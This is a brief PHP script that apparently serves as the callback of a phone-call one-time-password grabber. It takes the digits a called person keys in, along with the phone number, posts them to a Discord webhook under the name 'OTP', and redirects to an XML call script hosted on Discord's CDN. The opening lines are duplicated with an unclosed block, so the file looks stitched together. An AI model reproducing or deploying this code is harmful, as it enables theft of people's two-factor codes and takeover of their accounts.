<?php
$digits = $_GET['Digits'];
$called = $_GET['Called'];




<?php
$digits = $_GET['Digits'];
$called = $_GET['Called'];
$webhookurl = "";


$json_data = json_encode([
    "username" => "OTP",
    "avatar_url" => "https://a.pomf.cat/yavmxq.png",
    "embeds" => [
        [
            "type" => "rich",
            "description" => "**Code:** $digits\n**Number:** $called",
            "color" => hexdec( "38147B" ),
            "author" => [
                "name" => "OTP",
                "url" => "https://meowth.tokyo/"
            ],
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
curl_close( $ch );
header("Location: https://cdn.discordapp.com/attachments/928323556708872306/938644487985578035/final.xml");